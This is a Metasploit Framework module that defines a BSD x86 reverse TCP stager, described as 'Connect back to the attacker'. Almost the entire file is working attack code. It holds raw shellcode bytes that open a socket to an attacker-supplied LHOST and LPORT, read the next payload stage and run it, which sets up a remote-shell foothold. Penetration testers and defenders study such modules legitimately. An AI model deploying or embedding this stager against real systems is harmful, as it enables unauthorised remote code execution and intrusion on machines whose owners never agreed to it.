##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# BSD reverse TCP stager.
#
###
module Metasploit3

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => 'skape',
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST' => [ 0x0a, 'ADDR' ],
              'LPORT' => [ 0x13, 'n'    ],
            },
          'Payload' =>
            "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68\x7f\x00\x00\x01\xcd\x80" +
            "\x68\x10\x02\xbf\xbf\x89\xe1\x6a\x10\x51\x50\x51\x97\x6a\x62\x58" +
            "\xcd\x80\xb0\x03\xc6\x41\xfd\x10\xcd\x80\xc3"
        }
      ))
  end

end
